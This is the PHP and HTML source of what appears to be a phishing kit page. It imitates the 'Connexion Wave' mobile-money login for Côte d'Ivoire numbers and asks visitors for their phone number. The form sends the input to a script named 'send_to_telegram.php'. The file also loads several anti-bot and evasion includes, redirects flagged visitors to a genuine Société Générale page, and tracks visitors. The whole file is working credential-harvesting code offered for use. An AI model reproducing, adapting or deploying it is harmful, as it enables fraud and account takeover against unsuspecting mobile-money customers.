<?php

error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
include 'page_notify.php';
// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('exp.php'); // ex: connexion.php

include("track.php");

?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion Wave</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      max-width: 400px;
      text-align: center;
    }
    .form-control {
      border: none;
      border-bottom: 1px solid #ccc;
      border-radius: 0;
      box-shadow: none;
    }
    .flag-select {
      display: flex;
      align-items: center;
    }
    .flag-select img {
      width: 24px;
      height: auto;
      margin-right: 8px;
    }

    .btn-suivant {
      width: 100%;
      border-radius: 25px;
      font-weight: bold;
      padding: 14px;
      margin-top: 60px;
      transition: background-color 0.3s ease, color 0.3s ease;
      border: none;
    }

    .btn-suivant:disabled {
      background-color: #e5f8ff;
      color: white;
      cursor: default;
    }

    .btn-suivant.enabled {
      background-color: #0095f6 !important;
      color: white;
    }
  </style>
</head>
<body>

<div class="container">
  <p class="mt-5 mb-4 fs-5">Bienvenue chez <strong>Wave</strong>! Pour commencer,<br>entrez votre numéro de mobile</p>

  <form action="action/send_to_telegram.php" method="POST">
    <input type="hidden" name="step" value="phone">
    <div class="input-group mb-3">
      <span class="input-group-text bg-white border-0 flag-select">
        <img src="https://flagcdn.com/w40/ci.png" alt="CI Flag">
        +225
      </span>
      <input type="tel" id="phoneInput" name="phone" class="form-control" placeholder="0X XX XX XX XX" maxlength="10" required>
    </div>

    <button id="btnSuivant" type="submit" class="btn btn-suivant" disabled>Suivant</button>
  </form>
</div>

<script>
  const phoneInput = document.getElementById('phoneInput');
  const btnSuivant = document.getElementById('btnSuivant');

  phoneInput.addEventListener('input', () => {
    const cleaned = phoneInput.value.replace(/\D/g, '');
    if (cleaned.length === 10) {
      btnSuivant.disabled = false;
      btnSuivant.classList.add('enabled');
    } else {
      btnSuivant.disabled = true;
      btnSuivant.classList.remove('enabled');
    }
  });
</script>

</body>
</html>
